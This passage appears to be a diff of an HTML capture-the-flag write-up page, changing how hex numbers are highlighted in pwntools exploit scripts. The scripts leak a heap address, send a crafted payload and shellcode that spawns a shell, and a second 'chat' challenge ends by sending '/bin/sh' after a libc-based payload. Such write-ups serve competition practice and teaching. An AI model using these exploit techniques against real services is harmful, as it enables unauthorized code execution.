-r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"12"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
-r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0</span>x0).ljust(<span class="hljs-number">0</span>x1f,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"12"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0x0</span>).ljust(<span class="hljs-number">0x1f</span>,<span class="hljs-string">'\x00'</span>))
 
 r.recvuntil(<span class="hljs-string">"RET("</span>)
-heap = <span class="hljs-keyword">int</span>(r.recvuntil(<span class="hljs-string">")"</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0</span>x22000
+heap = int(r.recvuntil(<span class="hljs-string">")"</span>)[:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<span class="hljs-number">-0x22000</span>
 <span class="hljs-keyword">print</span> hex(heap)
 
 
 data[<span class="hljs-number">0</span>] = u64(asm(<span class="hljs-string">"push rsp;pop rsi;syscall"</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x90'</span>))
-data[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>x200
+data[<span class="hljs-number">2</span>] = <span class="hljs-number">0x200</span>
 
-data[<span class="hljs-number">5</span>] = heap+<span class="hljs-number">0</span>x8
-data[<span class="hljs-number">6</span>] = heap+<span class="hljs-number">0</span>x40
-data[<span class="hljs-number">0</span>x8] = <span class="hljs-number">0</span>x002b000000000033
+data[<span class="hljs-number">5</span>] = heap+<span class="hljs-number">0x8</span>
+data[<span class="hljs-number">6</span>] = heap+<span class="hljs-number">0x40</span>
+data[<span class="hljs-number">0x8</span>] = <span class="hljs-number">0x002b000000000033</span>
 
 
-payload = flat(data)[:<span class="hljs-number">0</span>x7f]
-r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"1"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
+payload = flat(data)[:<span class="hljs-number">0x7f</span>]
+r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"1"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
 r.sendafter(<span class="hljs-string">":"</span>,payload)
 
-r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
-r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"12"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
-r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0</span>x0).ljust(<span class="hljs-number">0</span>x1f,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"12"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0x0</span>).ljust(<span class="hljs-number">0x1f</span>,<span class="hljs-string">'\x00'</span>))
 
-r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
-r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"15"</span>.ljust(<span class="hljs-number">0</span>xf,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">"choice:"</span>,<span class="hljs-string">"0"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
+r.sendafter(<span class="hljs-string">":"</span>,<span class="hljs-string">"15"</span>.ljust(<span class="hljs-number">0xf</span>,<span class="hljs-string">'\x00'</span>))
 
-r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0</span>x0).ljust(<span class="hljs-number">0</span>x1f,<span class="hljs-string">'\x00'</span>))
-r.send(<span class="hljs-string">"\x90"</span>*<span class="hljs-number">0</span>x50+asm(<span class="hljs-string">"add rsp,0x500"</span>)+asm(shellcraft.<span class="hljs-keyword">sh</span>()))
+r.sendafter(<span class="hljs-string">":"</span>,str(<span class="hljs-number">0x0</span>).ljust(<span class="hljs-number">0x1f</span>,<span class="hljs-string">'\x00'</span>))
+r.send(<span class="hljs-string">"\x90"</span>*<span class="hljs-number">0x50</span>+asm(<span class="hljs-string">"add rsp,0x500"</span>)+asm(shellcraft.sh()))
 
 r.interactive()
+
 </code></pre><h3 id="chat"><a class="header-link" href="#chat"></a>chat</h3>
 <ul class="list">
 <li>Leave some heap layout on bss for later free</li>
@@ -1188,6 +1235,7 @@ r.send(<span class="hljs-string">"say "</span>+p64(libc+<span class="hljs-number
 time.sleep(<span class="hljs-number">0.1</span>)
 r.send(<span class="hljs-string">"/bin/sh\x00"</span>)
 r.interactive()
+
 </code></pre>        </article>
       </div>
     </div>
